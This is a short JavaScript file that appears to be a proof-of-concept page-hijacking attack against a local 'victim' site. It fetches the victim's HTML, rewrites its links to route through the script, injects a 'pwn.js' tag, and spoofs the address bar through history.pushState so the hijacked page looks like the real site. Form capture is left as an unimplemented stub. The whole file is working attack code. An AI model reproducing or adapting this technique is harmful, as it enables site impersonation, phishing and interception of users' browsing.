'use strict';

const INJECT = 'inject';

const getSource = url => {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', url, false);
  xhr.send();
  return xhr.responseText;
};

const getTitle = src => {
  const matches = src.match(/<title>(.*)<\/title>/, src);
  return matches ? matches[1] : '';
};

const injectScript = src => `${src}\n<script src="pwn.js" type="text/javascript"></script>`;

// TODO Implement
const pwnSubmits = src => src;

// TODO Handle non-GET requests
const pwnLinks = src =>
  src.replace(/<a.*href="([^"]+)".*>(.*)<\/a>/g, `<a href="#" onclick="mockNavigate('victim/$1')">$2</a>`);

const pwnSource = src => injectScript(pwnSubmits(pwnLinks(src)));

const pwnUrl = url => pwnSource(getSource(url));

const setHtml = src => document.getElementById(INJECT).innerHTML = src;

const setTitle = title => document.title = title;

const setBrowserProps = src => {
  setHtml(src);
  setTitle(getTitle(src));
};

const mockNavigate = url => {
  const pwnedSource = pwnUrl(url);
  setBrowserProps(pwnedSource);
  window.history.pushState(pwnedSource, '', url.replace(/victim\//, ''));
};

window.onpopstate = e => {
  if (e.state) {
    setBrowserProps(e.state);
  }
};

mockNavigate('http://localhost:8080/victim/index.html');
